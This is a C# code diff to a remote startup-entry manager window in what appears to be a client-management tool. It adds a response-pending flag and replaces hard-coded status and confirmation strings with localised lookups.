@@ -14,6 +14,7 @@ public partial class StartupManagerWindow : ThemedWindow
     private readonly string    _clientId;
     private readonly ObservableCollection<StartupEntryVM> _entries = [];
     private CancellationTokenSource? _refreshCts;
+    private bool _awaitingResponse;
 
     public StartupManagerWindow(TlsServer server, string clientId, string clientLabel)
     {
@@ -54,6 +55,7 @@ public partial class StartupManagerWindow : ThemedWindow
         _refreshCts?.Cancel();
         _refreshCts = new CancellationTokenSource();
         var cts = _refreshCts;
+        _awaitingResponse = true;
         TxtStatus.Text = Lang.Get("STATUS_REFRESHING");
         await _server.SendToClient(_clientId, new Packet { Type = PacketType.StartupGetList });
         try
@@ -62,7 +64,7 @@ public partial class StartupManagerWindow : ThemedWindow
             // 14 s elapsed without a response — update status
             _ = Dispatcher.BeginInvoke(() =>
             {
-                if (TxtStatus.Text?.StartsWith("Refresh") == true)
+                if (_awaitingResponse)
                     TxtStatus.Text = Lang.Get("ERR_NO_RESPONSE");
             });
         }
@@ -88,8 +90,9 @@ public partial class StartupManagerWindow : ThemedWindow
                     if (isComTask) continue;
                     _entries.Add(new StartupEntryVM(e.Name, e.Type, e.Location, e.Path, e.Verified, e.Publisher));
                 }
+                _awaitingResponse = false;
                 TxtCount.Text  = $"({_entries.Count})";
-                TxtStatus.Text = $"Updated {DateTime.Now:HH:mm:ss} — {_entries.Count} startup item(s)";
+                TxtStatus.Text = string.Format(Lang.Get("STUP_UPDATED"), DateTime.Now.ToString("HH:mm:ss"), _entries.Count);
             });
         }
         catch { }
@@ -102,9 +105,9 @@ public partial class StartupManagerWindow : ThemedWindow
         var selected = GridStartup.SelectedItems.Cast<StartupEntryVM>().ToList();
         if (selected.Count == 0) return;
         string msg = selected.Count == 1
-            ? $"Delete startup entry '{selected[0].Name}'?"
-            : $"Delete {selected.Count} startup entries?";
-        if (MessageBox.Show(msg, "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
+            ? string.Format(Lang.Get("STUP_CONFIRM_1"), selected[0].Name)
+            : string.Format(Lang.Get("STUP_CONFIRM_N"), selected.Count);
+        if (MessageBox.Show(msg, Lang.Get("MSG_CONFIRM"), MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
 
         foreach (var row in selected)
         {
@@ -121,13 +124,13 @@ public partial class StartupManagerWindow : ThemedWindow
     private void GridStartup_CopyName_Click(object s, RoutedEventArgs e)
     {
         if (GridStartup.SelectedItem is StartupEntryVM vm)
-            try { System.Windows.Clipboard.SetText(vm.Name); TxtStatus.Text = $"Copied: {vm.Name}"; } catch { }
+            try { System.Windows.Clipboard.SetText(vm.Name); TxtStatus.Text = string.Format(Lang.Get("COPIED"), vm.Name); } catch { }
     }
 
     private void GridStartup_CopyPath_Click(object s, RoutedEventArgs e)
     {
         if (GridStartup.SelectedItem is StartupEntryVM vm)
-            try { System.Windows.Clipboard.SetText(vm.Path); TxtStatus.Text = $"Copied: {vm.Path}"; } catch { }
+            try { System.Windows.Clipboard.SetText(vm.Path); TxtStatus.Text = string.Format(Lang.Get("COPIED"), vm.Path); } catch { }
     }
 
     private void Close_Click(object s, RoutedEventArgs e) => Close();
